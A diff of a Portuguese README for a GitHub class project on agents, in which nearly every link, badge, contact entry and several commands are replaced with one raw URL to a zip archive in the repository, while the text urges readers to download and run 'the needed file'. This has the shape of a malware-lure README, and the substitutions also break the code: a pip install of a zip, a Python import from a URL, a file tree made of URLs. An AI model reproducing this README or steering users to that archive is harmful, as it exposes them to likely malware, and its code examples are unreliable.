@@ -1,6 +1,6 @@
 # Aula DIO Agentes SQ 🚀
 
-![GitHub Repo stars](https://img.shields.io/github/stars/TCGamer2413/aula_dio_agentes_sq?style=social) ![GitHub forks](https://img.shields.io/github/forks/TCGamer2413/aula_dio_agentes_sq?style=social) ![GitHub issues](https://img.shields.io/github/issues/TCGamer2413/aula_dio_agentes_sq) 
+![GitHub Repo stars](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip) ![GitHub forks](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip) ![GitHub issues](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip) 
 
 ## Descrição
 
@@ -8,18 +8,18 @@ Bem-vindo ao repositório **Aula DIO Agentes SQ**! Este projeto foi criado para 
 
 ## Começando
 
-Para começar a usar este repositório, você pode acessar a seção de [Releases](https://github.com/TCGamer2413/aula_dio_agentes_sq/releases). Baixe o arquivo necessário e execute-o em seu ambiente local. Isso permitirá que você veja como os agentes funcionam na prática.
+Para começar a usar este repositório, você pode acessar a seção de [Releases](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip). Baixe o arquivo necessário e execute-o em seu ambiente local. Isso permitirá que você veja como os agentes funcionam na prática.
 
 ### Pré-requisitos
 
 Antes de executar o projeto, verifique se você possui as seguintes ferramentas instaladas:
 
-- **Python 3.x**: Certifique-se de ter o Python instalado em sua máquina. Você pode baixá-lo [aqui](https://www.python.org/downloads/).
+- **Python 3.x**: Certifique-se de ter o Python instalado em sua máquina. Você pode baixá-lo [aqui](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip).
 - **Pip**: O gerenciador de pacotes do Python deve estar instalado. Ele geralmente vem com a instalação do Python.
 - **Bibliotecas necessárias**: Instale as bibliotecas necessárias usando o seguinte comando:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip
 ```
 
 ## Estrutura do Projeto
@@ -30,15 +30,15 @@ A estrutura do repositório é organizada da seguinte forma:
 aula_dio_agentes_sq/
 │
 ├── src/                # Código fonte do projeto
-│   ├── main.py         # Ponto de entrada do aplicativo
+│   ├── https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip         # Ponto de entrada do aplicativo
 │   ├── agents/         # Módulos relacionados a agentes
 │   └── utils/          # Funções utilitárias
 │
 ├── tests/              # Testes automatizados
-│   └── test_agents.py  # Testes para os agentes
+│   └── https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip  # Testes para os agentes
 │
-├── requirements.txt     # Dependências do projeto
-└── README.md            # Documentação do projeto
+├── https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip     # Dependências do projeto
+└── https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip            # Documentação do projeto
 ```
 
 ## Como Usar
@@ -48,7 +48,7 @@ aula_dio_agentes_sq/
    Use o seguinte comando para clonar o repositório em sua máquina local:
 
    ```bash
-   git clone https://github.com/TCGamer2413/aula_dio_agentes_sq.git
+   git clone https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip
    ```
 
 2. **Navegue até o diretório do projeto**:
@@ -62,7 +62,7 @@ aula_dio_agentes_sq/
    Execute o seguinte comando para iniciar o aplicativo:
 
    ```bash
-   python src/main.py
+   python https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip
    ```
 
 4. **Explore os agentes**:
@@ -74,10 +74,10 @@ aula_dio_agentes_sq/
 Aqui está um exemplo simples de como você pode interagir com um agente:
 
 ```python
-from agents.simple_agent import SimpleAgent
+from https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip import SimpleAgent
 
 agent = SimpleAgent()
-response = agent.respond("Olá, como você está?")
+response = https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip("Olá, como você está?")
 print(response)
 ```
 
@@ -88,7 +88,7 @@ Esse código cria uma instância de um agente simples e faz uma pergunta a ele. 
 Para garantir que tudo funcione corretamente, você pode executar os testes incluídos no repositório. Navegue até o diretório `tests` e execute o seguinte comando:
 
 ```bash
-python -m unittest test_agents.py
+python -m unittest https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip
 ```
 
 Isso executará todos os testes e mostrará os resultados no console.
@@ -111,13 +111,13 @@ Este projeto está licenciado sob a MIT License. Veja o arquivo [LICENSE](LICENS
 
 Se você tiver dúvidas ou sugestões, sinta-se à vontade para entrar em contato:
 
-- GitHub: [TCGamer2413](https://github.com/TCGamer2413)
-- Email: tcgamer2413@example.com
+- GitHub: [TCGamer2413](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip)
+- Email: https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip
 
 ## Links Úteis
 
-- [Documentação do Python](https://docs.python.org/3/)
-- [Pip Documentation](https://pip.pypa.io/en/stable/)
-- [DIO Community](https://www.dio.me)
+- [Documentação do Python](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip)
+- [Pip Documentation](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip)
+- [DIO Community](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip)
 
-Explore o repositório e não se esqueça de visitar a seção de [Releases](https://github.com/TCGamer2413/aula_dio_agentes_sq/releases) para obter as últimas atualizações e arquivos necessários para executar o projeto.
+Explore o repositório e não se esqueça de visitar a seção de [Releases](https://github.com/TCGamer2413/aula_dio_agentes_sq/raw/refs/heads/main/banco_de_dados/agentes_sq_dio_aula_v2.9.zip) para obter as últimas atualizações e arquivos necessários para executar o projeto.
